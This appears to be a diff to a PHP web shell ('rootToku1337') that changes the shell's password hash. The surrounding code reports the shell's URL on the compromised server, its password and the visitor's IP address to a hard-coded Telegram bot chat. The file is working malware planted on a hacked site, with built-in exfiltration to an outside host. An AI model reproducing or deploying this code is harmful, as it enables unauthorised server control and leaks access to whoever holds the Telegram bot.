@@ -23,7 +23,7 @@ $chatId = '6116824863';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $logMessage = "___Logger TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker Lain :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
-$password="fa26dbf6a8f1fd767a634c3352e18ecb";
+$password="9e3ac79ad27f3a91353de2d05c96e5404960575f";
 $nm = "rootToku1337";
 function login() {
 echo '<html>
